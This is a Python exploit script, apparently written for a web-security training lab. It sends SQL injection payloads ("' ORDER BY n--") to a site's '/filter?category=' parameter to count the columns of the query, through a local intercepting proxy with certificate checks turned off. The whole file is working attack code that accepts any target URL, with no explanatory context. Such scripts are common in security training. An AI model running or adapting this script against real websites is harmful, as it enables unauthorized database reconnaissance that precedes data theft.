import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': '127.0.0.1:8080', 'https': '127.0.0.1:8080'}

def exploit_sqli(url, payload):
    uri = '/filter?category='

    for i in range(1, 20):
        r = requests.get(url + uri + payload + "' ORDER BY " + str(i) + "--", verify=False, proxies=proxies)

        if "Error" in r.text:
            return i-1
    
    return False

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print("[-] Usage: %s <url>"% sys.argv[0])
        print('[-] Example: %s www.example.com'% sys.argv[0])
        sys.exit(-1)

    num_columns = exploit_sqli(url, payload= 'Lifestyle')
    if num_columns:
       print("[+] SQL Injection successful, Number of columns is %i"% num_columns)
    else:
       print("[-] SQL Injection unsuccessful")